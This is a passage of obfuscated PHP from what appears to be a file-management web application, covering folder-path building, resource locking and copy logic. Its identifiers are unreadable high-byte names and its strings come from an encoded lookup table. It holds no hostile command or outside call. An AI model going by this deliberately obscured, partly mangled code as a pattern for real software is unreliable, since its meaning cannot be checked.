$¸å‹„Ò–[$ÛŸ›’ŞÂ[$ÌÎğØˆÍ[402]]]; if (!is_array($ÛŸ›’ŞÂ[$ÌÎğØˆÍ[466]])) { $ÛŸ›’ŞÂ[$ÌÎğØˆÍ[466]] = array(); } $ÛŸ›’ŞÂ[$ÌÎğØˆÍ[466]][$ÌÎğØˆÍ[516]] = $Àç·ˆ­ [$ÌÎğØˆÍ[510]]; $ÛŸ›’ŞÂ[$ÌÎğØˆÍ[413]][$ÌÎğØˆÍ[517]] = $Àç·ˆ­ ; $ÛŸ›’ŞÂ[$ÌÎğØˆÍ[413]][$ÌÎğØˆÍ[518]] = $ÛŸ›’ŞÂ[$ÌÎğØˆÍ[519]]; $ÛŸ›’ŞÂ[$ÌÎğØˆÍ[413]][$ÌÎğØˆÍ[520]] = $ÌÎğØˆÍ[88]; if ($Àç·ˆ­ [$ÌÎğØˆÍ[454]] != $âÌ”ô€ï) { $ÛŸ›’ŞÂ[$ÌÎğØˆÍ[413]][$ÌÎğØˆÍ[414]] = $ÛŸ›’ŞÂ[$ÌÎğØˆÍ[413]][$ÌÎğØˆÍ[414]] & $Àç·ˆ­ [$ÌÎğØˆÍ[413]][$ÌÎğØˆÍ[413]]; } continue; } $÷· ğÔŠ = $this->parentLevelArray($ÛŸ›’ŞÂ[$ÌÎğØˆÍ[521]]); $¡œœ¹–Ã = array_reverse($÷· ğÔŠ); foreach ($¡œœ¹–Ã as $ƒ¦Ü÷îî => $—¹—ÌŒÎ) { if (!isset($¸å‹„Ò–[$—¹—ÌŒÎ])) { continue; } $Àç·ˆ­  = $¸å‹„Ò–[$—¹—ÌŒÎ]; $ÛŸ›’ŞÂ[$ÌÎğØˆÍ[413]][$ÌÎğØˆÍ[517]] = $Àç·ˆ­ ; if ($Àç·ˆ­ [$ÌÎğØˆÍ[454]] != $âÌ”ô€ï) { $ÛŸ›’ŞÂ[$ÌÎğØˆÍ[413]][$ÌÎğØˆÍ[414]] = $ÛŸ›’ŞÂ[$ÌÎğØˆÍ[413]][$ÌÎğØˆÍ[414]] & $Àç·ˆ­ [$ÌÎğØˆÍ[413]][$ÌÎğØˆÍ[413]]; } $Éİ°ñŞç = $ÌÎğØˆÍ[12]; $öãüøšœ = count($÷· ğÔŠ) - $ƒ¦Ü÷îî; for ($é°úÉÀß = 0; $é°úÉÀß < $öãüøšœ; $é°úÉÀß++) { if (!isset($½„ëï¼Ç[$÷· ğÔŠ[$é°úÉÀß]])) { $Éİ°ñŞç = $ÌÎğØˆÍ[12]; break; } $Éİ°ñŞç = $Éİ°ñŞç . rtrim($½„ëï¼Ç[$÷· ğÔŠ[$é°úÉÀß]], $ÌÎğØˆÍ[8]) . $ÌÎğØˆÍ[8]; } $ÛŸ›’ŞÂ[$ÌÎğØˆÍ[413]][$ÌÎğØˆÍ[518]] = rtrim($Éİ°ñŞç, $ÌÎğØˆÍ[8]) . $ÌÎğØˆÍ[8]; break; } } unset($ÛŸ›’ŞÂ); } public function groupPathDisplay(&$øÖå×âİ) { $±ôîØâ­ =& $_SERVER[Ì¥ŞÒ°£]; if ($øÖå×âİ[$±ôîØâ­[411]] != self::TYPE_GROUP) { return; } $æáÔëò = Model($±ôîØâ­[522])->getInfo($øÖå×âİ[$±ôîØâ­[505]]); $‘£ì÷Šø = $this->parentLevelArray($æáÔëò[$±ôîØâ­[521]]); $ßŞÆ» = $±ôîØâ­[12]; foreach ($‘£ì÷Šø as $°ŠÅò «) { $Ô·Ç¦µ¡ = Model($±ôîØâ­[522])->getInfo($°ŠÅò «); $ßŞÆ» .= $Ô·Ç¦µ¡[$±ôîØâ­[86]][$±ôîØâ­[402]] . $±ôîØâ­[50]; } $øÖå×âİ[$±ôîØâ­[523]] = $æáÔëò[$±ôîØâ­[432]]; $øÖå×âİ[$±ôîØâ­[524]] = $æáÔëò[$±ôîØâ­[521]]; $øÖå×âİ[$±ôîØâ­[525]] = $æáÔëò[$±ôîØâ­[526]]; $øÖå×âİ[$±ôîØâ­[527]] = $ßŞÆ» . $æáÔëò[$±ôîØâ­[86]][$±ôîØâ­[402]]; } protected function _listAppendPath(&$öõ”Ëôğ, $Ò÷€í¿ = false) { $Ø¶·±æ =& $_SERVER[Ì¥ŞÒ°£]; static $“ì¦Ğ = array(); $êŒ™»‡€ = array(); $—¹ûˆû = array(); if ($Ò÷€í¿) { return $“ì¦Ğ; } foreach ($öõ”Ëôğ as &$Éû¶ÛÑ§) { $´—¿Ïè¿ = $Éû¶ÛÑ§[$Ø¶·±æ[402]]; if ($Éû¶ÛÑ§[$Ø¶·±æ[410]] == $Ø¶·±æ[88] && $Éû¶ÛÑ§[$Ø¶·±æ[432]] != 0) { $“ì¦Ğ[$´—¿Ïè¿] = $Éû¶ÛÑ§[$Ø¶·±æ[32]]; } if ($Éû¶ÛÑ§[$Ø¶·±æ[410]] == $Ø¶·±æ[88] && $Éû¶ÛÑ§[$Ø¶·±æ[432]] == 0 && !isset($“ì¦Ğ[$´—¿Ïè¿])) { $“ì¦Ğ[$´—¿Ïè¿] = $this->_listAppendPathRoot($Éû¶ÛÑ§, array()); } if (isset($—¹ûˆû[$Éû¶ÛÑ§[$Ø¶·±æ[521]]])) { continue; } $—¹ûˆû[$Éû¶ÛÑ§[$Ø¶·±æ[521]]] = !0; $°åêè¿Õ = $this->parentLevelArray($Éû¶ÛÑ§[$Ø¶·±æ[521]]); foreach ($°åêè¿Õ as $­Œúèµà => $ãûÍ—‚…) { if (isset($“ì¦Ğ[$ãûÍ—‚…])) { continue; } if ($­Œúèµà == 0) { $“ì¦Ğ[$ãûÍ—‚…] = $this->_listAppendPathRoot($Éû¶ÛÑ§, $°åêè¿Õ); } if ($­Œúèµà != 0) { $êŒ™»‡€[] = $ãûÍ—‚…; } } } unset($Éû¶ÛÑ§); $êŒ™»‡€ = array_unique($êŒ™»‡€); if (count($êŒ™»‡€) > 0) { $­üİÎ¹‡ = array($Ø¶·±æ[417] => array($Ø¶·±æ[418], $êŒ™»‡€)); if (count($êŒ™»‡€) == 1) { $Öª“Éø = $this->sourceInfo($êŒ™»‡€[0]); $¥ü‰¯ˆÁ = is_array($Öª“Éø) ? array($Öª“Éø) : !1; } else { $¥ü‰¯ˆÁ = $this->field($Ø¶·±æ[528])->where($­üİÎ¹‡)->select(); } if (!$¥ü‰¯ˆÁ) { $¥ü‰¯ˆÁ = array(); } foreach ($¥ü‰¯ˆÁ as $ˆà±şì ) { $“ì¦Ğ[$ˆà±şì [$Ø¶·±æ[402]]] = $ˆà±şì [$Ø¶·±æ[32]]; } } $Æ§öíï« = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $œ»ñÊ»Ä = array(); foreach ($öõ”Ëôğ as &$Éû¶ÛÑ§) { $šğ‰€£ = $Éû¶ÛÑ§[$Ø¶·±æ[521]]; $µêö›×Ñ = $Ø¶·±æ[12]; if (isset($œ»ñÊ»Ä[$šğ‰€£])) { $µêö›×Ñ = $œ»ñÊ»Ä[$šğ‰€£]; } else { $°åêè¿Õ = $this->parentLevelArray($Éû¶ÛÑ§[$Ø¶·±æ[521]]); foreach ($°åêè¿Õ as $­Œúèµà => $ãûÍ—‚…) { if (isset($“ì¦Ğ[$ãûÍ—‚…])) { $µêö›×Ñ .= $“ì¦Ğ[$ãûÍ—‚…] . $Ø¶·±æ[8]; } } $œ»ñÊ»Ä[$šğ‰€£] = $µêö›×Ñ; } $µêö›×Ñ .= $Éû¶ÛÑ§[$Ø¶·±æ[32]]; if ($Éû¶ÛÑ§[$Ø¶·±æ[410]] == $Ø¶·±æ[88]) { $µêö›×Ñ .= $Ø¶·±æ[8]; } $Éû¶ÛÑ§[$Ø¶·±æ[519]] = str_replace($Ø¶·±æ[529], $Ø¶·±æ[8], $µêö›×Ñ); if ($Éû¶ÛÑ§[$Ø¶·±æ[432]] == $Ø¶·±æ[197]) { $Éû¶ÛÑ§[$Ø¶·±æ[32]] = trim($“ì¦Ğ[$Éû¶ÛÑ§[$Ø¶·±æ[402]]], $Ø¶·±æ[8]); $Éû¶ÛÑ§[$Ø¶·±æ[519]] = $Éû¶ÛÑ§[$Ø¶·±æ[32]] . $Ø¶·±æ[8]; } if (intval($Éû¶ÛÑ§[$Ø¶·±æ[411]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($Éû¶ÛÑ§, $°åêè¿Õ, $Æ§öíï«); } } unset($Éû¶ÛÑ§); return $öõ”Ëôğ; } private function _listAppendPathRecycle(&$ê…ğÌª, $ ‰¾òÊ», $ÅµŸøŒ) { $˜Î‘³ÀĞ =& $_SERVER[Ì¥ŞÒ°£]; if (!in_array($ÅµŸøŒ, $ ‰¾òÊ») && $ê…ğÌª[$˜Î‘³ÀĞ[402]] != $ÅµŸøŒ) { return; } $‹¢úÁêÄ = explode($˜Î‘³ÀĞ[8], trim($ê…ğÌª[$˜Î‘³ÀĞ[519]], $˜Î‘³ÀĞ[8])); $©Üõ¶­ = implode($˜Î‘³ÀĞ[8], array_slice($‹¢úÁêÄ, 2)); $ê…ğÌª[$˜Î‘³ÀĞ[519]] = $˜Î‘³ÀĞ[8] . LNG($˜Î‘³ÀĞ[530]) . $˜Î‘³ÀĞ[8] . ltrim($©Üõ¶­, $˜Î‘³ÀĞ[8]); $ê…ğÌª[$˜Î‘³ÀĞ[521]] = $˜Î‘³ÀĞ[531] . implode($˜Î‘³ÀĞ[50], array_slice($ ‰¾òÊ», 1)) . $˜Î‘³ÀĞ[50]; if ($ê…ğÌª[$˜Î‘³ÀĞ[402]] == $ÅµŸøŒ) { $ê…ğÌª[$˜Î‘³ÀĞ[521]] = $˜Î‘³ÀĞ[531]; $ê…ğÌª[$˜Î‘³ÀĞ[432]] = $˜Î‘³ÀĞ[197]; $ê…ğÌª[$˜Î‘³ÀĞ[32]] = LNG($˜Î‘³ÀĞ[530]); } $ê…ğÌª[$˜Î‘³ÀĞ[532]] = $˜Î‘³ÀĞ[533]; } protected function _listAppendPathRoot(&$¶äË­„ù, $¹»¤®£‹) { $Ã“¦ï¥­ =& $_SERVER[Ì¥ŞÒ°£]; static $ÀÕ ºÁÚ = false; $¶›ÃÈ©Æ = $Ã“¦ï¥­[12]; if ($¶äË­„ù[$Ã“¦ï¥­[411]] == self::TYPE_USER) { if (defined($Ã“¦ï¥­[475]) && $¶äË­„ù[$Ã“¦ï¥­[505]] == USER_ID) { $¶›ÃÈ©Æ = LNG($Ã“¦ï¥­[534]); if ($ÀÕ ºÁÚ === !1) { $ ùç­¨ë = Model($Ã“¦ï¥­[535])->getInfoFull(USER_ID); $ÀÕ ºÁÚ = _get($ ùç­¨ë, $Ã“¦ï¥­[536], $Ã“¦ï¥­[12]); } if ($¹»¤®£‹ && $¹»¤®£‹[0] == $ÀÕ ºÁÚ || !$¹»¤®£‹ && $¶äË­„ù[$Ã“¦ï¥­[402]] == $ÀÕ ºÁÚ) { $¶›ÃÈ©Æ = LNG($Ã“¦ï¥­[537]); $¶äË­„ù[$Ã“¦ï¥­[538]] = $Ã“¦ï¥­[539]; } if (!$¹»¤®£‹) { $¶äË­„ù[$Ã“¦ï¥­[32]] = $¶›ÃÈ©Æ; } } else { $òÂ´è = Model($Ã“¦ï¥­[513])->getInfoSimple($¶äË­„ù[$Ã“¦ï¥­[505]]); $¶›ÃÈ©Æ = LNG($Ã“¦ï¥­[540]) . $Ã“¦ï¥­[162] . $òÂ´è[$Ã“¦ï¥­[32]] . $Ã“¦ï¥­[164]; $¶äË­„ù[$Ã“¦ï¥­[541]] = array($Ã“¦ï¥­[32] => $òÂ´è[$Ã“¦ï¥­[32]], $Ã“¦ï¥­[542] => $òÂ´è[$Ã“¦ï¥­[542]], $Ã“¦ï¥­[543] => $òÂ´è[$Ã“¦ï¥­[543]]); } } else { if ($¶äË­„ù[$Ã“¦ï¥­[411]] == self::TYPE_GROUP) { $òÂ´è = Model($Ã“¦ï¥­[522])->getInfoSimple($¶äË­„ù[$Ã“¦ï¥­[505]]); $¶›ÃÈ©Æ = $òÂ´è[$Ã“¦ï¥­[32]]; } else { if ($¶äË­„ù[$Ã“¦ï¥­[411]] == self::TYPE_SYSTEM) { $¶›ÃÈ©Æ = $Ã“¦ï¥­[544]; } } } $¶›ÃÈ©Æ = $¶›ÃÈ©Æ ? $Ã“¦ï¥­[8] . $¶›ÃÈ©Æ . $Ã“¦ï¥­[8] : $Ã“¦ï¥­[8]; return $¶›ÃÈ©Æ; } protected function _listAppendUser(&$°¯ğÔ‹´) { $®Âöâ§  =& $_SERVER[Ì¥ŞÒ°£]; $–‡™Î›Ç = array_to_keyvalue($°¯ğÔ‹´, $®Âöâ§ [12], $®Âöâ§ [454]); $Ô´ÜË™ã = array_to_keyvalue($°¯ğÔ‹´, $®Âöâ§ [12], $®Âöâ§ [456]); $Ùª’æœ€ = array_merge($–‡™Î›Ç, $Ô´ÜË™ã); $Ş®Ğàøü = Model($®Âöâ§ [535])->userListInfo($Ùª’æœ€); foreach ($°¯ğÔ‹´ as &$Ø£É¾˜É) { $ëûíš¥ = $Ø£É¾˜É[$®Âöâ§ [454]]; $Ø£É¾˜É[$®Âöâ§ [454]] = $Ş®Ğàøü[$ëûíš¥] ? $Ş®Ğàøü[$ëûíš¥] : !1; $ëûíš¥ = $Ø£É¾˜É[$®Âöâ§ [456]]; $Ø£É¾˜É[$®Âöâ§ [456]] = $Ş®Ğàøü[$ëûíš¥] ? $Ş®Ğàøü[$ëûíš¥] : !1; if (isset($Ø£É¾˜É[$®Âöâ§ [466]]) && $Ø£É¾˜É[$®Âöâ§ [466]][$®Âöâ§ [545]]) { $ŠÇÌ˜›ç = $GLOBALS[$®Âöâ§ [6]][$®Âöâ§ [89]][$®Âöâ§ [546]]; if ($Ø£É¾˜É[$®Âöâ§ [466]][$®Âöâ§ [547]] <= time() - $ŠÇÌ˜›ç) { $this->metaSet($Ø£É¾˜É[$®Âöâ§ [402]], $®Âöâ§ [545], null); $this->metaSet($Ø£É¾˜É[$®Âöâ§ [402]], $®Âöâ§ [547], null); unset($Ø£É¾˜É[$®Âöâ§ [466]][$®Âöâ§ [545]]); continue; } $–ù¸¨€ = $Ø£É¾˜É[$®Âöâ§ [466]][$®Âöâ§ [545]]; $Ø£É¾˜É[$®Âöâ§ [466]][$®Âöâ§ [548]] = Model($®Âöâ§ [535])->getInfoSimpleOuter($–ù¸¨€); } } unset($Ø£É¾˜É); } public function parentLevelArray($âÀ—…¼ß) { $à´ş±Ÿ« =& $_SERVER[Ì¥ŞÒ°£]; $âÀ—…¼ß = explode($à´ş±Ÿ«[50], trim($âÀ—…¼ß, $à´ş±Ÿ«[50])); return array_remove_value($âÀ—…¼ß, $à´ş±Ÿ«[197]); } public function listAll($×±´Ê†) { $êú©œÒº =& $_SERVER[Ì¥ŞÒ°£]; $ìü¯ó–û = $this->sourceInfo($×±´Ê†); $œÍ±Ÿåş = array($êú©œÒº[549] => array($êú©œÒº[550], $ìü¯ó–û[$êú©œÒº[521]] . $×±´Ê† . $êú©œÒº[551]), $êú©œÒº[552] => 0); $ì¢¯ÂÆ÷ = $êú©œÒº[553]; $¿Î¾şª‰ = "\x4c\x45\106\x54\40\112\x4f\x49\116\x20{$this->tablePrefix}\x69\x6f\137\146\151\154\145\40\x66\151\x6c\x65\40\157\x6e\x20\163\x6f\165\x72\x63\145\x2e\x66\x69\154\x65\111\x44\x20\75\40\146\151\154\x65\x2e\x66\151\154\145\111\x44"; $Ç½Ö‡ÎÛ = $this->alias($êú©œÒº[446])->field($ì¢¯ÂÆ÷)->where($œÍ±Ÿåş)->join($¿Î¾şª‰)->select(); $this->_listAppendAuth($Ç½Ö‡ÎÛ); $this->_listAppendUser($Ç½Ö‡ÎÛ); $this->_listAppendPath($Ç½Ö‡ÎÛ); $Ç½Ö‡ÎÛ = array_to_keyvalue($Ç½Ö‡ÎÛ, $êú©œÒº[402]); $ö¿Ş¬²Ø = "\57{$ìü¯ó–û[$êú©œÒº[32]]}\x2f"; $ö¿Ş¬²Ø = $ö¿Ş¬²Ø == $êú©œÒº[529] ? $êú©œÒº[8] : $ö¿Ş¬²Ø; $Š§çœ = array(); foreach ($Ç½Ö‡ÎÛ as $ÈÉâ±°Ş => $ëè®ô×) { $Æş’à û = $this->parentLevelArray($ëè®ô×[$êú©œÒº[521]]); array_shift($Æş’à û); $³–Ä‹¹Ü = $ö¿Ş¬²Ø; for ($ƒÀ¨ˆó† = 0; $ƒÀ¨ˆó† < count($Æş’à û); $ƒÀ¨ˆó†++) { $³–Ä‹¹Ü .= $Ç½Ö‡ÎÛ[$Æş’à û[$ƒÀ¨ˆó†]][$êú©œÒº[32]] . $êú©œÒº[8]; } $³–Ä‹¹Ü .= $ëè®ô×[$êú©œÒº[32]]; if ($ëè®ô×[$êú©œÒº[410]]) { $³–Ä‹¹Ü .= $êú©œÒº[8]; } $³–Ä‹¹Ü = str_replace($êú©œÒº[529], $êú©œÒº[8], $³–Ä‹¹Ü); $³–Ä‹¹Ü = str_replace($êú©œÒº[529], $êú©œÒº[8], $³–Ä‹¹Ü); $¨ˆ©…‚ü = array($êú©œÒº[421] => str_replace($êú©œÒº[529], $êú©œÒº[8], $³–Ä‹¹Ü), $êú©œÒº[554] => intval($ëè®ô×[$êú©œÒº[410]]), $êú©œÒº[86] => $this->pathInfoFilter($ëè®ô×)); if (!$ëè®ô×[$êú©œÒº[410]]) { $¨ˆ©…‚ü[$êú©œÒº[468]] = $ëè®ô×[$êú©œÒº[468]]; $¨ˆ©…‚ü[$êú©œÒº[87]] = $ëè®ô×[$êú©œÒº[84]]; } $Š§çœ[] = $¨ˆ©…‚ü; } return $Š§çœ; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($¤¯”À‡î) { $‚Ôô¦ =& $_SERVER[Ì¥ŞÒ°£]; if (!$this->allowLock()) { return; } $this->_lockCheck($‚Ôô¦[555], $¤¯”À‡î); $â¸‘‡Øõ = 1; $this->_lockEvent($¤¯”À‡î, array($‚Ôô¦[556], $‚Ôô¦[557]), $â¸‘‡Øõ); $this->_lockParent($¤¯”À‡î, array($‚Ôô¦[557]), $â¸‘‡Øõ); $this->_lockEvent($¤¯”À‡î, array($‚Ôô¦[558], $‚Ôô¦[559]), $â¸‘‡Øõ); $this->_lockCheckEnd($‚Ôô¦[555], $¤¯”À‡î); } public function lockCopyEnd($ş®ÇÀˆ) { $©ß«Ç =& $_SERVER[Ì¥ŞÒ°£]; if (!$this->allowLock()) { return; } $Ïù âıà = 0; $this->_lockEvent($ş®ÇÀˆ, array($©ß«Ç[556], $©ß«Ç[557]), $Ïù âıà); $this->_lockParent($ş®ÇÀˆ, array($©ß«Ç[557]), $Ïù âıà); $this->_lockEvent($ş®ÇÀˆ, array($©ß«Ç[558], $©ß«Ç[559]), $Ïù âıà); } public function lockWriteStart($®¡”üÔâ, $×çÀÆí = '') { $—©œÀ¾ =& $_SERVER[Ì¥ŞÒ°£]; if (!$this->allowLock()) { return; } $this->_lockCheck($—©œÀ¾[556], $®¡”üÔâ); $ãÍ‹²ıú = 1; $this->_lockKey($—©œÀ¾[560] . $®¡”üÔâ . $—©œÀ¾[10] . $×çÀÆí, $ãÍ‹²ıú); $this->_lockEvent($®¡”üÔâ, array($—©œÀ¾[555], $—©œÀ¾[557]), $ãÍ‹²ıú); $this->_lockParent($®¡”üÔâ, array($—©œÀ¾[555], $—©œÀ¾[557]), $ãÍ‹²ıú); $this->_lockCheckEnd($—©œÀ¾[556], $®¡”üÔâ); } public function lockWriteEnd($¦åªß«ı, $¡²ˆ•Æá = '') { $ËÍÁª“ =& $_SERVER[Ì¥ŞÒ°£]; if (!$this->allowLock()) { return; } $õ»³ÅÏÚ = 0; $this->_lockKey($ËÍÁª“[560] . $¦åªß«ı . $ËÍÁª“[10] . $¡²ˆ•Æá, $õ»³ÅÏÚ); $this->_lockEvent($¦åªß«ı, array($ËÍÁª“[555], $ËÍÁª“[557]), $õ»³ÅÏÚ); $this->_lockParent($¦åªß«ı, array($ËÍÁª“[555], $ËÍÁª“[557]), $õ»³ÅÏÚ); } public function lockMoveStart($ÃøËá†) { $ˆ•Îş® =& $_SERVER[Ì¥ŞÒ°£]; if (!$this->allowLock()) { return; } $this->_lockCheck($ˆ•Îş®[557], $ÃøËá†); $£®Ğ¦…õ = 1; $this->_lockKey($ˆ•Îş®[561] . $ÃøËá†, $£®Ğ¦…õ); $this->_lockEvent($ÃøËá†, array($ˆ•Îş®[555], $ˆ•Îş®[556]), $£®Ğ¦…õ); $this->_lockParent($ÃøËá†, array($ˆ•Îş®[555], $ˆ•Îş®[557]), $£®Ğ¦…õ); $this->_lockEvent($ÃøËá†, array($ˆ•Îş®[562], $ˆ•Îş®[558], $ˆ•Îş®[559]), $£®Ğ¦…õ); $this->_lockCheckEnd($ˆ•Îş®[557], $ÃøËá†); } public function lockMoveEnd($à“Ä±Ÿè) { $ŸŠÔìŞ• =& $_SERVER[Ì¥ŞÒ°£]; if (!$this->allowLock()) { return; } $“úÙÕå¨ = 0; $this->_lockKey($ŸŠÔìŞ•[561] . $à“Ä±Ÿè, $“úÙÕå¨); $this->_lockEvent($à“Ä±Ÿè, array($ŸŠÔìŞ•[555], $ŸŠÔìŞ•[556]), $“úÙÕå¨); $this->_lockParent($à“Ä±Ÿè, array($ŸŠÔìŞ•[555], $ŸŠÔìŞ•[557]), $“úÙÕå¨); $this->_lockEvent($à“Ä±Ÿè, array($ŸŠÔìŞ•[562], $ŸŠÔìŞ•[558], $ŸŠÔìŞ•[559]), $“úÙÕå¨); } private function _lockCheck($„µ‘ƒõ‡, $ÎéŠ¢Ãµ) { $Ã«…Ò˜Î =& $_SERVER[Ì¥ŞÒ°£]; $ç˜»¯ô¾ = $this->sourceInfo($ÎéŠ¢Ãµ); $¡ËÀş·Ú = $„µ‘ƒõ‡ . $Ã«…Ò˜Î[10] . $ÎéŠ¢Ãµ; $this->_lockTimeStart[$¡ËÀş·Ú] = timeFloat(); if (!is_array($ç˜»¯ô¾)) { return; } $½øÕéäÕ = LNG($Ã«…Ò˜Î[563]); CacheLock::setErrorMsg($Ã«…Ò˜Î[162] . htmlspecialchars($ç˜»¯ô¾[$Ã«…Ò˜Î[32]]) . $Ã«…Ò˜Î[164] . $½øÕéäÕ); $this->_lockKey($¡ËÀş·Ú, 1); $this->_lockKey($¡ËÀş·Ú, 0); $·å„á¹ = array_reverse($this->parentLevelArray($ç˜»¯ô¾[$Ã«…Ò˜Î[521]])); foreach ($·å„á¹ as $Œˆé¢ûß) { $¡ËÀş·Ú = $„µ‘ƒõ‡ . $Ã«…Ò˜Î[564] . $Œˆé¢ûß; if (CacheLock::lockGet($Ã«…Ò˜Î[565] . $¡ËÀş·Ú)) { $ç˜»¯ô¾ = $this->sourceInfo($Œˆé¢ûß); CacheLock::setErrorMsg($Ã«…Ò˜Î[162] . htmlspecialchars($ç˜»¯ô¾[$Ã«…Ò˜Î[32]]) . $Ã«…Ò˜Î[164] . $½øÕéäÕ); $this->_lockKey($¡ËÀş·Ú, 1); $this->_lockKey($¡ËÀş·Ú, 0); } } } private function _lockCheckEnd($ãİéˆ, $ó¿«ÔğÁ) { $¬­Í«í =& $_SERVER[Ì¥ŞÒ°£]; $Œö²”¬Â = $ãİéˆ . $¬­Í«í[10] . $ó¿«ÔğÁ; CacheLock::setErrorMsg($¬­Í«í[378]); if (!isset($this->_lockTimeStart[$Œö²”¬Â])) { return; } $•°‹ÕÃŠ = timeFloat() - $this->_lockTimeStart[$Œö²”¬Â]; unset($this->_lockTimeStart[$Œö²”¬Â]); if ($•°‹ÕÃŠ > 0.5) { unset(self::$cacheSourceInfo[$¬­Í«í[460] . $ó¿«ÔğÁ]); } $³”Õ¦–” = $this->sourceInfo($ó¿«ÔğÁ); if (!$³”Õ¦–”) { show_json(LNG($¬­Í«í[105]), !1); } } private function _lockParent($¯Î¦À”‡, $‘Õ†ôãÑ, $÷İ­“‘¥) { if (!$this->autoLockSet) { return; } $©šÊ“ùş = $this->sourceInfo($¯Î¦À”‡); if (!is_array($©šÊ“ùş)) { return; } $çµ³Ô´– = array_reverse($this->parentLevelArray($©šÊ“ùş[$_SERVER[Ì¥ŞÒ°£][521]])); foreach ($çµ³Ô´– as $†‘§¬œ) { $this->_lockEvent($†‘§¬œ, $‘Õ†ôãÑ, $÷İ­“‘¥); } } private function _lockEvent($«äŠÕÉ², $ıÍâù¢Å, $ßêÇ›ú) { $„á”  =& $_SERVER[Ì¥ŞÒ°£]; if (!$this->autoLockSet) { return; } foreach ($ıÍâù¢Å as $¹¬íÜ€¨) { $–ŞîéÃ = $¹¬íÜ€¨ . $„á” [10] . $«äŠÕÉ²; if ($ßêÇ›ú && CacheLock::lockGet($„á” [565] . $–ŞîéÃ)) { continue; } $this->_lockKey($–ŞîéÃ, $ßêÇ›ú); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ƒ¡Ø£óà, $ä˜ŸïÊ¹ = 1) { $íä¼åî = $_SERVER[Ì¥ŞÒ°£][565] . md5($ƒ¡Ø£óà); if ($ä˜ŸïÊ¹) { if (isset(self::$_lockItemArr[$íä¼åî])) { return; } self::$_lockItemArr[$íä¼åî] = 1; CacheLock::lock($íä¼åî, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$íä¼åî])) { return; } unset(self::$_lockItemArr[$íä¼åî]); CacheLock::unlock($íä¼åî); } } public function isParentOf($Úıšƒô, $ÖğĞøúõ) { $ì†²¥Ğ‘ =& $_SERVER[Ì¥ŞÒ°£]; $ç«—ºƒ = $this->sourceInfo($Úıšƒô); $³•½ìÈŠ = $this->sourceInfo($ÖğĞøúõ); $‚û¬öêó = $ç«—ºƒ[$ì†²¥Ğ‘[521]] . $ç«—ºƒ[$ì†²¥Ğ‘[402]] . $ì†²¥Ğ‘[50]; $¤—”ŒÜë = $³•½ìÈŠ[$ì†²¥Ğ‘[521]] . $³•½ìÈŠ[$ì†²¥Ğ‘[402]] . $ì†²¥Ğ‘[50]; $ªšÙ¤‡© = strpos($¤—”ŒÜë, $‚û¬öêó) === 0; return $ªšÙ¤‡©; } private $targetIsDelete = 0; public function copy($ˆ°ã´İ³, $ÅˆÈû½½, $Úú²¦ÂË = REPEAT_REPLACE, $ù­×şß = '') { $¯ãÈ€şÃ =& $_SERVER[Ì¥ŞÒ°£]; $˜àö‡™ì = $this->sourceInfo($ˆ°ã´İ³); $­µ¾ùÕ = $this->sourceInfo($ÅˆÈû½½); if (!$˜àö‡™ì || !$­µ¾ùÕ || $­µ¾ùÕ[$¯ãÈ€şÃ[410]] != $¯ãÈ€şÃ[88]) { return !1; } if ($this->isParentOf($ˆ°ã´İ³, $ÅˆÈû½½)) { return !1; } $šÓüê±ß = $ù­×şß ? $ù­×şß : $˜àö‡™ì[$¯ãÈ€şÃ[32]]; $this->lockCopyStart($ˆ°ã´İ³); $this->lockWriteStart($ÅˆÈû½½, $šÓüê±ß); $ÕÀ°ƒö = array($¯ãÈ€şÃ[566] => array(), $¯ãÈ€şÃ[567] => array(), $¯ãÈ€şÃ[568] => array()); $this->targetIsDelete = intval($˜àö‡™ì[$¯ãÈ€şÃ[431]]); $©Ç• õ = $this->fileNameExistCache($ÅˆÈû½½, $˜àö‡™ì[$¯ãÈ€şÃ[32]]); $öˆ»ºĞ = $this->_copy($ˆ°ã´İ³, $ÅˆÈû½½, $Úú²¦ÂË, $ÕÀ°ƒö, !0, $ù­×şß); $this->_childrenListClear(); $this->lockCopyEnd($ˆ°ã´İ³); $this->lockWriteEnd($ÅˆÈû½½, $šÓüê±ß); if ($˜àö‡™ì[$¯ãÈ€şÃ[410]] == $¯ãÈ€şÃ[88] && $©Ç• õ == $öˆ»ºĞ) { $this->folderSizeResetChildren($©Ç• õ); } Model($¯ãÈ€şÃ[569])->addAll($ÕÀ°ƒö[$¯ãÈ€şÃ[567]], array(), !0); if ($©Ç• õ != $öˆ»ºĞ || $˜àö‡™ì[$¯ãÈ€şÃ[410]] == $¯ãÈ€şÃ[88]) { Model($¯ãÈ€şÃ[570])->eventCopy($öˆ»ºĞ); } $this->saveAll($ÕÀ°ƒö[$¯ãÈ€şÃ[568]]); Model($¯ãÈ€şÃ[199])->linkAdd($ÕÀ°ƒö[$¯ãÈ€şÃ[566]]); $this->folderSizeReset($ÅˆÈû½½); $this->updateModifyTime($ÅˆÈû½½); return $öˆ»ºĞ; } private function _copy($Ñ†É˜•¢, $ÖòÉë„š, $ª‘¥åˆ„, &$ßä¤ùÑ, $²Áûì÷ß, $±¥‰èıï = '') { $ĞÇÄĞ· =& $_SERVER[Ì¥ŞÒ°£]; $–¢„ Ì = $this->sourceInfoCache($Ñ†É˜•¢); $Æãû¤Æ = $–¢„ Ì[$ĞÇÄĞ·[410]] == $ĞÇÄĞ·[88]; $‚Ñö‚ÉÅ = $±¥‰èıï ? $±¥‰èıï : $–¢„ Ì[$ĞÇÄĞ·[32]]; $¥›Å«Ä• = $this->fileNameExistCache($ÖòÉë„š, $‚Ñö‚ÉÅ); if ($²Áûì÷ß) { $this->_childrenAllMake($Ñ†É˜•¢); if ($Æãû¤Æ && $¥›Å«Ä•) { $this->_childrenAllMake($¥›Å«Ä•); } } if (!$¥›Å«Ä•) { return $this->_copyCreate($Ñ†É˜•¢, $ÖòÉë„š, $‚Ñö‚ÉÅ, $ßä¤ùÑ); } $óÕÁŠ® = $¥›Å«Ä•; if ($Æãû¤Æ) { if ($ª‘¥åˆ„ == REPEAT_RENAME_FOLDER) { $‚Ñö‚ÉÅ = $this->fileNameAutoCache($ÖòÉë„š, $‚Ñö‚ÉÅ, $ª‘¥åˆ„, $Æãû¤Æ); $óÕÁŠ® = 